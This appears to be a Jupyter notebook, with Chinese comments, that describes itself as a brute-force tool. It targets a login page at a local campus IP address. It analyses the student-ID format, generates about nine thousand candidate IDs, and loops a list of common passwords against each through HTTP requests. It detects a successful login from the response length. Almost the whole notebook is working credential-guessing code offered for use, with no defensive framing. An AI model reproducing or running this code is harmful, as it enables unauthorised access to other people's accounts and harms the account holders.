{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 这是一个爆破工具\n",
    "> Top 10密码"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* 逆向分析\n",
    "http://192.168.168.46/"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "\n",
    "<form id=\"login\" action=\"http://192.168.168.46/?$USERURL\" method=\"POST\">\n",
    "<input name=\"username\" class=\"input\" id=\"user\" type=\"text\" size=\"25\" placeholder=\"登录名\" value=\"\">\n",
    "\n",
    "<input name=\"password\" class=\"input\" id=\"password\" onpaste=\"return false;\" type=\"password\" size=\"25\" placeholder=\"密码\" value=\"\">\n",
    "<input name=\"rmbUser\" id=\"rmbUser\" type=\"checkbox\" value=\"1\"><span>\n",
    "</form>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* 学号分析 \n",
    "\n",
    "2013-100-****\n",
    "\n",
    "前四位： 年级\n",
    "\n",
    "后两位100\n",
    "\n",
    "后四位"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import urllib"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 143,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "set=[\"1234567890\",\"0123456789\",\"88888888\",\"00000000\",\"987654321\",\"666666\",\"1314520\",\"5201314\",\"147258369\"]\n",
    "action=\"http://192.168.168.46/?$USERURL\"\n",
    "testAccount=[]\n",
    "for i in range(1000,9999):\n",
    "    testAccount.append(\"2013100%04d\"%i)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "def getPostData(username,mayBePassword):\n",
    "    return {\"username\":username,\"password\":mayBePassword}\n",
    "def testPassword(userName,passWord):\n",
    "    data=getPostData(userName,passWord)\n",
    "    url_parame=urllib.parse.urlencode(data)\n",
    "    all_url=action+url_parame\n",
    "    data=urllib.request.urlopen(all_url).read()\n",
    "    length=len(data)\n",
    "    if length==4720 or length==4721:\n",
    "        print(userName,passWord)\n",
    "    else:\n",
    "        print(leng)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 外包公司，，，比较了字符串的前面几位，，\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "for testA in testAccount:\n",
    "    for testP in set:\n",
    "        testPassword(testA,testP)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
